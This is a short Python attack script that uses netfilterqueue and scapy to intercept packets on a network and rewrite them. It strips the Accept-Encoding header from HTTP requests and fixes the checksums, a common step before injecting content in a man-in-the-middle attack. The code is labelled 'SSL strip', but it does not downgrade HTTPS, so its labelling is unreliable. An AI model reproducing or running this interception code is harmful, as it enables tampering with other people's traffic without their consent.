from netfilterqueue import NetfilterQueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if b"Accept-Encoding" in scapy_packet[scapy.Raw].load:
            print("[+] Stripping SSL...")
            scapy_packet[scapy.Raw].load = scapy_packet[scapy.Raw].load.replace(b"Accept-Encoding", b"")
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].chksum
            packet.set_payload(bytes(scapy_packet))
    packet.accept()

def start_ssl_strip():
    queue = NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
